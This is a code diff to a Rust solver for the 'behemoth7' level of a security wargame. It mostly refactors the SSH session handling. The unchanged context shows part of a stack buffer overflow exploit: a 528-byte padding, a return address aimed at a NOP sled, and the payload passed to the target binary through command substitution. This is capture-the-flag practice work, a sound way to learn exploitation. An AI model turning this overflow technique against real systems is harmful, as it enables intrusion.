@@ -5,11 +5,9 @@ use anyhow::Result;
 /// differences were the length was 528 to the ret address, and nothing in that buffer could be non-alphanumeric
 /// the ret address itself and the stack after it could be whatever though, so just moved things about a bit
 pub fn solve(password: &str) -> Result<String> {
-    let session = ssh_session(super::HOST, super::PORT, "behemoth7", password)?;
-    let mut channel = session.channel_session()?;
-    create_shell(&mut channel)?;
-
-    read_until(&mut channel, "$ ")?;
+    
+    let mut ssh = SSHShell::connect(super::HOST, super::PORT, "behemoth7", password)?;
+    ssh.read_until("$ ")?;
 
     let prefix: Vec<u8> = vec![0x41; 528];
     let var_adr = hex_decode("a0d2ffff")?; // 0xffffd35c, approximate location in nop sled
@@ -30,10 +28,10 @@ pub fn solve(password: &str) -> Result<String> {
     println!("running '{target} $(echo -en [payload])'");
 
     let cmd = format!("{target} $(echo -en \"{encoded}\")");
-    write_line(&mut channel, &cmd)?;
+    ssh.write_line(&cmd)?;
 
     println!("reading result");
-    let result = read_until(&mut channel, "$ ")?;
+    let result = ssh.read_until("$ ")?;
     let result = result
         .split(['\r', '\n'])
         .map(|s| s.trim())
